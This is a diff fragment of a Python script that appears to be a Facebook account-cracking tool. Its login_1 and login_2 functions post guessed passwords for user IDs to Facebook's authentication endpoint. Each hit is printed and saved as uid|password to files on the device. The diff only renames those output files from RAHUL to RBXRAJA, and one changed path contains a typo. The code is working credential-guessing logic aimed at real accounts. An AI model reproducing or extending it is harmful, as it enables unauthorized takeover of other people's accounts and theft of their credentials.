@@ -435,12 +435,12 @@ def login_1(uid):
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                               if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAHUL🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAHUL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                open('/sdcard/RBXRAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAHUL🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/RAHUL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                open('/sdcard)RBXRAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -471,12 +471,12 @@ def login_2(uid):
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAHUL🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAHUL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    open('/sdcard/RBXRAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
                     print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAHUL🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/RAHUL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    open('/sdcard/RBXRAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
